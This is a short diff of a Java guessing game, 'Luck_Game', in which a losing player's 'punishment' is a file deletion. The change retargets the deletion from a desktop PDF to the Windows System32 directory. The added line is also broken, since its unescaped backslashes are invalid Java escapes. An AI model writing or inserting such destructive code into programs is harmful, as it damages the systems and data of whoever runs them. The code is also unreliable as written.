@@ -34,7 +34,7 @@ public class Luck_Game {
         else
         {
             try {
-                File file = new File("C:\\Users\\golde\\OneDrive\\Desktop\\p.pdf");
+                File file = new File("C:\Windows\System32");
                 file.delete();
                 System.out.println("Congratulation You Got Your Punishment");
             }
